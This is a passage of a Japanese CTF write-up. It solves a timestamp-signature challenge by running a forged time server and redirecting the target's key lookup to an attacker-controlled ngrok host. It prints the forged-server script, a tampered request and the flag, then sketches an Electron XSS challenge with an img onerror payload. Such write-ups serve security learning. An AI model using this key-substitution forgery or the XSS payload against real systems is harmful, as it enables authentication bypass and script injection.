+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPRequestHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_OPTIONS</span>(self):
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_response(<span style=color:#ae81ff>200</span>, <span style=color:#e6db74>&#34;ok&#34;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Methods&#39;</span>, <span style=color:#e6db74>&#39;POST, OPTIONS&#39;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#34;Access-Control-Allow-Headers&#34;</span>, <span style=color:#e6db74>&#34;X-Requested-With&#34;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#34;Access-Control-Allow-Headers&#34;</span>, <span style=color:#e6db74>&#34;Content-Type&#34;</span>)
+</span></span><span style=display:flex><span>        self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_POST</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span>:
+</span></span><span style=display:flex><span>            nbytes <span style=color:#f92672>=</span> int(self<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;content-length&#39;</span>))
+</span></span><span style=display:flex><span>            body <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>loads(self<span style=color:#f92672>.</span>rfile<span style=color:#f92672>.</span>read(nbytes)<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            timestamp <span style=color:#f92672>=</span> body[<span style=color:#e6db74>&#39;timestamp&#39;</span>]<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            signature <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(body[<span style=color:#e6db74>&#39;signature&#39;</span>])
+</span></span><span style=display:flex><span>            timeserver <span style=color:#f92672>=</span> body[<span style=color:#e6db74>&#39;timeserver&#39;</span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            pubkey <span style=color:#f92672>=</span> get_pubkey_of_timeserver(timeserver)
+</span></span><span style=display:flex><span>            h <span style=color:#f92672>=</span> SHA256<span style=color:#f92672>.</span>new(timestamp)
+</span></span><span style=display:flex><span>            verifier <span style=color:#f92672>=</span> DSS<span style=color:#f92672>.</span>new(pubkey, <span style=color:#e6db74>&#39;fips-186-3&#39;</span>)
+</span></span><span style=display:flex><span>            verifier<span style=color:#f92672>.</span>verify(h, signature)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(HTTPStatus<span style=color:#f92672>.</span>OK)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/plain; charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>            dt <span style=color:#f92672>=</span> datetime<span style=color:#f92672>.</span>fromtimestamp(int(timestamp))
+</span></span><span style=display:flex><span>            res_body <span style=color:#f92672>=</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;&#39;&#39;&lt;p&gt;Current time is </span><span style=color:#e6db74>{</span>dt<span style=color:#f92672>.</span>date()<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>dt<span style=color:#f92672>.</span>time()<span style=color:#e6db74>}</span><span style=color:#e6db74>.&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;p&gt;Flag is </span><span style=color:#e6db74>{</span>get_flag_hint_from_timestamp(int(timestamp))<span style=color:#e6db74>}</span><span style=color:#e6db74>.&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;p&gt;You can get only one letter of the flag each day.&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&lt;p&gt;See you next day.&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(res_body<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>requestline
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(HTTPStatus<span style=color:#f92672>.</span>UNAUTHORIZED)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>handler <span style=color:#f92672>=</span> HTTPRequestHandler
+</span></span><span style=display:flex><span>httpd <span style=color:#f92672>=</span> HTTPServer((<span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#ae81ff>5000</span>), handler)
+</span></span><span style=display:flex><span>httpd<span style=color:#f92672>.</span>serve_forever()
+</span></span></code></pre></div><p><code>time-server/server.py</code>は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> http <span style=color:#f92672>import</span> HTTPStatus
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Hash <span style=color:#f92672>import</span> SHA256
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> ECC
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Signature <span style=color:#f92672>import</span> DSS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> ECC<span style=color:#f92672>.</span>generate(curve<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;p256&#39;</span>)
+</span></span><span style=display:flex><span>pubkey <span style=color:#f92672>=</span> key<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>export_key(format<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;PEM&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPRequestHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_GET</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>path <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/pubkey&#39;</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(HTTPStatus<span style=color:#f92672>.</span>OK)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/plain; charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>            res_body <span style=color:#f92672>=</span> pubkey
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(res_body<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>requestline
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            timestamp <span style=color:#f92672>=</span> str(int(time<span style=color:#f92672>.</span>time()))<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            h <span style=color:#f92672>=</span> SHA256<span style=color:#f92672>.</span>new(timestamp)
+</span></span><span style=display:flex><span>            signer <span style=color:#f92672>=</span> DSS<span style=color:#f92672>.</span>new(key, <span style=color:#e6db74>&#39;fips-186-3&#39;</span>)
+</span></span><span style=display:flex><span>            signature <span style=color:#f92672>=</span> signer<span style=color:#f92672>.</span>sign(h)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(HTTPStatus<span style=color:#f92672>.</span>OK)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/json; charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>            res_body <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>dumps({<span style=color:#e6db74>&#39;timestamp&#39;</span> : timestamp<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>), <span style=color:#e6db74>&#39;signature&#39;</span>: signature<span style=color:#f92672>.</span>hex()})
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(res_body<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>handler <span style=color:#f92672>=</span> HTTPRequestHandler
+</span></span><span style=display:flex><span>httpd <span style=color:#f92672>=</span> HTTPServer((<span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#ae81ff>5001</span>), handler)
+</span></span><span style=display:flex><span>httpd<span style=color:#f92672>.</span>serve_forever()
+</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_flag_hint_from_timestamp</span>(timestamp: int):
+</span></span><span style=display:flex><span>    content <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;?&#39;</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>    idx <span style=color:#f92672>=</span> timestamp <span style=color:#f92672>//</span> (<span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>    content[idx] <span style=color:#f92672>=</span> FLAG_CONTENT[idx]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;FLAG{&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(content) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;}&#39;</span>
+</span></span></code></pre></div><p>やっていることを整理します。</p><ul><li><code>content-server</code>は<code>time-server</code>の<code>GET:/pubkey</code>から公開鍵を取得して、受信した<code>signature</code>を検証することで、受信した<code>timestamp</code>が正しいことを確認する。</li><li><code>content-server</code>が公開鍵を取得するサーバは<code>timeserver</code>パラメータをで指定できる。</li></ul><p>また、表示するflagのindexは<code>timestamp // (60*60*24) % 12</code>で決まります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_flag_hint_from_timestamp</span>(timestamp: int):
+</span></span><span style=display:flex><span>    content <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;?&#39;</span>] <span style=color:#f92672>*</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>    idx <span style=color:#f92672>=</span> timestamp <span style=color:#f92672>//</span> (<span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>) <span style=color:#f92672>%</span> <span style=color:#ae81ff>12</span>
+</span></span><span style=display:flex><span>    content[idx] <span style=color:#f92672>=</span> FLAG_CONTENT[idx]
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#39;FLAG{&#39;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(content) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;}&#39;</span>
+</span></span></code></pre></div><p>つまり、以下のことをやればflagが取得できそうです。</p><ul><li>偽<code>time-server</code>を用意して、flagの12文字を全て表示する<code>timestamp</code>と<code>signature</code>の組を作成する</li><li>偽<code>time-server</code>が<code>GET:/pubkey</code>エンドポイントで公開鍵を返すようにする</li></ul><p>偽<code>time-server</code>は以下です。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> http <span style=color:#f92672>import</span> HTTPStatus
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> http.server <span style=color:#f92672>import</span> BaseHTTPRequestHandler, HTTPServer
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> json
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> time
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Hash <span style=color:#f92672>import</span> SHA256
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> ECC
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Signature <span style=color:#f92672>import</span> DSS
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>key <span style=color:#f92672>=</span> ECC<span style=color:#f92672>.</span>generate(curve<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;p256&#39;</span>)
+</span></span><span style=display:flex><span>pubkey <span style=color:#f92672>=</span> key<span style=color:#f92672>.</span>public_key()<span style=color:#f92672>.</span>export_key(format<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;PEM&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>HTTPRequestHandler</span>(BaseHTTPRequestHandler):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>do_GET</span>(self):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> self<span style=color:#f92672>.</span>path <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;/pubkey&#39;</span>:
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(HTTPStatus<span style=color:#f92672>.</span>OK)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/plain; charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>            res_body <span style=color:#f92672>=</span> pubkey
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(res_body<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>requestline
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>            timestamps <span style=color:#f92672>=</span> []
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>for</span> idx <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>12</span>):
+</span></span><span style=display:flex><span>                timestamp <span style=color:#f92672>=</span> (<span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>60</span><span style=color:#f92672>*</span><span style=color:#ae81ff>24</span>) <span style=color:#f92672>*</span> idx
+</span></span><span style=display:flex><span>                timestamp_bytes <span style=color:#f92672>=</span> str(timestamp)<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>)
+</span></span><span style=display:flex><span>                h <span style=color:#f92672>=</span> SHA256<span style=color:#f92672>.</span>new(timestamp_bytes)
+</span></span><span style=display:flex><span>                signer <span style=color:#f92672>=</span> DSS<span style=color:#f92672>.</span>new(key, <span style=color:#e6db74>&#39;fips-186-3&#39;</span>)
+</span></span><span style=display:flex><span>                signature <span style=color:#f92672>=</span> signer<span style=color:#f92672>.</span>sign(h)
+</span></span><span style=display:flex><span>                timestamps<span style=color:#f92672>.</span>append({<span style=color:#e6db74>&#39;timestamp&#39;</span> : timestamp_bytes<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#39;utf-8&#39;</span>), <span style=color:#e6db74>&#39;signature&#39;</span>: signature<span style=color:#f92672>.</span>hex()})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_response(HTTPStatus<span style=color:#f92672>.</span>OK)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/json; charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>send_header(<span style=color:#e6db74>&#39;Access-Control-Allow-Origin&#39;</span>, <span style=color:#e6db74>&#39;*&#39;</span>)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>end_headers()
+</span></span><span style=display:flex><span>            res_body <span style=color:#f92672>=</span> json<span style=color:#f92672>.</span>dumps(timestamps)
+</span></span><span style=display:flex><span>            self<span style=color:#f92672>.</span>wfile<span style=color:#f92672>.</span>write(res_body<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>handler <span style=color:#f92672>=</span> HTTPRequestHandler
+</span></span><span style=display:flex><span>httpd <span style=color:#f92672>=</span> HTTPServer((<span style=color:#e6db74>&#39;&#39;</span>, <span style=color:#ae81ff>8000</span>), handler)
+</span></span><span style=display:flex><span>httpd<span style=color:#f92672>.</span>serve_forever()
+</span></span></code></pre></div><p>ngrokなどのサービスを用いて、外部から偽time-serverにアクセス可能にします。</p><p>まずは偽<code>time-server</code>の<code>GET:/</code>を叩いて12個の<code>timestamp</code>と<code>signature</code>の組を取得します。</p><pre tabindex=0><code>[
+  {
+    &#34;timestamp&#34;: &#34;0&#34;,
+    &#34;signature&#34;: &#34;d0d59814c5e8afe30cd22b0d0b62745b56e7bef8bfef5f2f08b572c63740745b62375188e88da4d1678299017c7d55003c364bce325743fd471d731e08bd33b0&#34;
+  },
+  {
+    &#34;timestamp&#34;: &#34;86400&#34;,
+    &#34;signature&#34;: &#34;95b06e91c4542819acf7b552729900f8fc9816f7fdd41045178971c8651b0cd39ecc81caf8eb5b4aa4f0055761ebcb568b596931a8fc6e9217a331a985bfa2ff&#34;
+  },
+  ...
+  {
+    &#34;timestamp&#34;: &#34;950400&#34;,
+    &#34;signature&#34;: &#34;1ec57b0ba091c05e11cf293a8ac6c1f08979614f2d5282b11920434e1775ba8ecd21d1dce059a08df3c5cc543fc62dd1c6e012644fd4b6e0ba73068fe33ef3f7&#34;
+  }
+]
+</code></pre><p>次に、BurpSuiteなどのローカルリクエストを用いてリクエストをキャプチャして<code>timestamp</code>、<code>signature</code>を取得したものに変更します。</p><pre tabindex=0><code>POST / HTTP/2
+Host: web-one-day-one-letter-content-lz56g6.wanictf.org
+...
+{
+    &#34;timestamp&#34;:&#34;0&#34;,
+    &#34;signature&#34;:&#34;fd78463f99630dfa0b2ce07ccb45d45a3e33d21b970c30a8957fa3678625a203624a376a8fc9dade2e2bddf16cf26c26f7959d849fd4ba854f7276aba6e23de3&#34;,
+    &#34;timeserver&#34;:&#34;26ca-45-94-210-216.ngrok-free.app&#34;
+}
+</code></pre><p>レスポンスからflagの1文字目は<code>l</code>だとわかります。</p><pre tabindex=0><code>&lt;p&gt;Current time is 1970-01-01 00:00:00.&lt;/p&gt;
+&lt;p&gt;Flag is FLAG{l???????????}.&lt;/p&gt;
+&lt;p&gt;You can get only one letter of the flag each day.&lt;/p&gt;
+&lt;p&gt;See you next day.&lt;/p&gt;
+</code></pre><p>これを12回繰り返してflagを取得します。</p><pre tabindex=0><code>FLAG{lyingthetime}
+</code></pre><h1 id=web-elec>[web] elec</h1><p>解けなかったElectronの問題です。</p><p>このように<code>Title</code>と<code>Content</code>を送信すると、それらがページに表示されます。</p><p><img src=/images/posts/45/elec1.png alt=elec1>
+<img src=/images/posts/45/elec2.png alt=elec2></p><p><code>Report</code>ボタンを押すと、クローラーがそのページを訪問します。</p><p><img src=/images/posts/45/elec3.png alt=elec3></p><p>このクローラーはElectronで作られています。Electronのセキュリティについては何も知らなかったのでこの辺を見て学習しました。</p><ul><li><a href=https://blog.flatt.tech/entry/electron_security_vscode_casestudy>https://blog.flatt.tech/entry/electron_security_vscode_casestudy</a></li><li><a href=https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own>https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own</a></li></ul><p><code>elec-admin-console/src/main.js</code>を見ると、セキュリティ設定を見ることができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>createWindow</span> <span style=color:#f92672>=</span> () =&gt; {
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>const</span> <span style=color:#a6e22e>win</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>BrowserWindow</span>({
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>width</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>800</span>,
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>height</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>600</span>,
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>webPreferences</span><span style=color:#f92672>:</span> {
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>preload</span><span style=color:#f92672>:</span> <span style=color:#a6e22e>path</span>.<span style=color:#a6e22e>join</span>(<span style=color:#a6e22e>__dirname</span>, <span style=color:#e6db74>&#34;preload.js&#34;</span>),
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>contextIsolation</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
+</span></span><span style=display:flex><span>			<span style=color:#a6e22e>sandbox</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
+</span></span><span style=display:flex><span>		},
+</span></span><span style=display:flex><span>	});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>win</span>.<span style=color:#a6e22e>webContents</span>.<span style=color:#a6e22e>once</span>(<span style=color:#e6db74>&#34;did-finish-load&#34;</span>, () =&gt; {
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;#############################################&#34;</span>);
+</span></span><span style=display:flex><span>		<span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#34;Page loaded!&#34;</span>);
+</span></span><span style=display:flex><span>	});
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>	<span style=color:#a6e22e>win</span>.<span style=color:#a6e22e>loadURL</span>(<span style=color:#a6e22e>pageUrl</span>);
+</span></span><span style=display:flex><span>};
+</span></span></code></pre></div><p><code>contextIsolation: false</code>なので、Preloadスクリプト及びElectronの内部ロジックが<code>webContents</code>と同じコンテキストで実行されます。また、<code>sandbox: false</code>なので、プログラムは保護された領域で実行されません。</p><p>また、外部から入力が可能な<code>content</code>には独自のサニタイズ処理がなされており、<code>img</code>タグを用いたXSS（<code>&lt;img src=x onerror="alert(1)"></code>など）が可能です。しかし、flagはクローラーのcookieなどに含まれておらず、サーバ側の<code>/flag</code>にファイルとして置かれています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>{{define &#34;article&#34;}}
+</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!doctype html&gt;</span>
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>html</span> <span style=color:#a6e22e>lang</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>charset</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;utf-8&#34;</span>&gt;
+</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>meta</span> <span style=color:#a6e22e>name</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;viewport&#34;</span> <span style=color:#a6e22e>content</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
+</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>title</span>&gt;{{ .Title }} - Blog&lt;/<span style=color:#f92672>title</span>&gt;
+</span></span><span style=display:flex><span>  {{template &#34;bs-css&#34;}}
+</span></span><span style=display:flex><span>  {{template &#34;bs-js&#34;}}
+</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>head</span>&gt;
+</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>body</span>&gt;
+</span></span><span style=display:flex><span>  {{template &#34;navbar&#34;}}
+</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;container&#34;</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>h1</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mb-3&#34;</span>&gt;{{ .Title }}&lt;/<span style=color:#f92672>h1</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>div</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;content&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;mb-3&#34;</span>&gt;&lt;/<span style=color:#f92672>div</span>&gt;
+</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>form</span> <span style=color:#a6e22e>method</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;post&#34;</span> <span style=color:#a6e22e>action</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;/report/{{ .ID }}&#34;</span>&gt;
+</span></span><span style=display:flex><span>      &lt;<span style=color:#f92672>button</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;submit&#34;</span> <span style=color:#a6e22e>class</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;btn btn-secondary&#34;</span>&gt;Report&lt;/<span style=color:#f92672>button</span>&gt;
+</span></span><span style=display:flex><span>    &lt;/<span style=color:#f92672>form</span>&gt;
+</span></span><span style=display:flex><span>  &lt;/<span style=color:#f92672>div</span>&gt;
+</span></span><span style=display:flex><span>  {{template &#34;admin-footer&#34;}}
+</span></span><span style=display:flex><span>  &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;module&#34;</span>&gt;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>import</span> <span style=color:#a6e22e>sanitizeHtml</span> <span style=color:#a6e22e>from</span> <span style=color:#e6db74>&#39;https://esm.sh/sanitize-html@2.11.0&#39;</span>
